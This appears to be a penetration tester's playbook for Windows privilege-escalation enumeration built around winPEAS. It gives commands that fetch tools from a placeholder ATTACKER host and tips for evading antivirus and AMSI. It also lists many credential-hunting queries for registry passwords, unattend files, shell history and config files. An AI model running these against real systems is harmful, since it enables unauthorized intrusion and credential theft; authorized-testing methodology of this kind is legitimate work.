# Windows enumeration playbook — winPEAS first
# In-scope host, approval-gated, READ-ONLY recon. Enumeration changes nothing; save raw output as evidence.
# Goal: produce enum.json/enum.txt that the vector table in windows_privesc_playbook.md keys off.
# (The winPEAS twin of the linux-privesc linpeas.sh playbook.)

`whoami /all` is the single highest-signal command on Windows (token privileges decide everything). Run
**winPEAS** as the spine, confirm with PowerUp/Seatbelt, and feed `systeminfo` to WES-NG offline for the
patch/kernel angle.

═══════════════════════════════════════════════════════════════════════════
## 1. whoami — do this first
═══════════════════════════════════════════════════════════════════════════
```
whoami /all        # GROUPS + PRIVILEGES + integrity level. The headline:
whoami /priv       #   SeImpersonatePrivilege / SeAssignPrimaryToken -> Potato -> SYSTEM
                   #   SeBackupPrivilege   -> read SAM/SYSTEM        SeRestorePrivilege -> write anywhere
                   #   SeDebugPrivilege    -> open lsass             SeTakeOwnership   -> own any file (utilman)
whoami /groups     # BUILTIN\Administrators but filtered by UAC? -> UAC bypass path
```
An enabled `Se*Privilege` is usually a faster, safer win than any exploit — check here before running winPEAS.

═══════════════════════════════════════════════════════════════════════════
## 2. winPEAS — the spine
═══════════════════════════════════════════════════════════════════════════

### Get it onto the target
```
# SMB share from attacker:   impacket-smbserver share . -smb2support
#   target:  copy \\ATTACKER\share\winPEASx64.exe C:\Windows\Temp\wp.exe
# certutil / PowerShell download:
certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe C:\Windows\Temp\wp.exe
powershell -c "iwr http://ATTACKER/winPEASx64.exe -OutFile $env:TEMP\wp.exe"
# AV/AMSI flags winPEAS often -> use the .bat (winPEAS.bat), the obfuscated build, or run manual checks (§4).
```

### Run it (keep the output)
```
C:\Windows\Temp\wp.exe log=enum.txt            # all checks, write to file (= evidence)
winPEASany.exe quiet cmd fast                   # quieter/faster; 'cmd' = non-coloured (readable in a plain shell)
winPEASx64.exe systeminfo userinfo servicesinfo # targeted sections (also: applicationsinfo windowscreds
                                                #   filesinfo processinfo networkinfo)
.\winPEAS.ps1                                    # PowerShell variant when the exe is blocked
```
Colour legend: **RED = interesting / likely a PE vector**, GREEN = a capability you already have. Every red
service/registry/cred hit maps to a row in `windows_privesc_playbook.md`. Extract them into `enum.json`.

═══════════════════════════════════════════════════════════════════════════
## 3. Second opinions
═══════════════════════════════════════════════════════════════════════════
```
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"      # service/registry/DLL/cred checks + GUI-less
.\SharpUp.exe audit                                               # C# PowerUp
.\Seatbelt.exe -group=all                                        # host triage (creds, tokens, autoruns, …)
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
python wes.py systeminfo.txt                                      # WES-NG: run OFFLINE on attacker vs saved systeminfo
.\accesschk.exe -accepteula -uwcqv "Users" *                     # writable services for the Users group
```

═══════════════════════════════════════════════════════════════════════════
## 4. Manual enumeration — confirm + fill gaps (works when AV eats winPEAS)
═══════════════════════════════════════════════════════════════════════════
```
## System / patch
systeminfo        &  wmic qfe get HotFixID        # -> WES-NG / exploit-suggester
hostname & ver & echo %PROCESSOR_ARCHITECTURE%

## Services — unquoted path / weak perms / writable binary
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | select Name,PathName,StartName
wmic service get name,pathname,startname | findstr /i /v '"'          # unquoted paths
.\accesschk.exe -accepteula -uwcqv "Authenticated Users" *           # SERVICE_CHANGE_CONFIG / _ALL_ACCESS
icacls "C:\Path\To\service.exe"                                      # (M)/(F) for your group = overwrite

## AlwaysInstallElevated (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## Scheduled tasks / autoruns
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Get-CimInstance Win32_StartupCommand | select Name,Command,Location

## Saved credentials / loot
cmdkey /list                                                        # -> runas /savecred /user:<u> cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword   # autologon
reg query HKLM /f password /t REG_SZ /s      &   reg query HKCU /f password /t REG_SZ /s
type C:\Windows\Panther\Unattend.xml 2>nul & type C:\Unattend.xml 2>nul & type C:\sysprep.inf 2>nul
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
findstr /si "connectionString password" C:\inetpub\*.config C:\*\web.config
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /f "Proxy" /s
dir /s /b C:\*pass* C:\*cred* C:\*.kdbx 2>nul & cmdkey /list

## Installed software (vs known-vuln + DLL hijack)
wmic product get name,version,vendor      &      Get-ChildItem 'C:\Program Files','C:\Program Files (x86)'
```

## Output → evidence contract
- `enum.txt`  : raw winPEAS/whoami/manual output (verbatim) — PoC evidence.
- `enum.json` : distilled vectors `[{vector, evidence, section, risk, next}]` driving the exploit pass.
- READ-ONLY. Any tool dropped to disk (`C:\Windows\Temp\wp.exe`) is recorded in `cleanup.md` and removed.
  Never claim a vector winPEAS merely colour-coded — confirm it (accesschk/icacls/reg) before it's a finding.
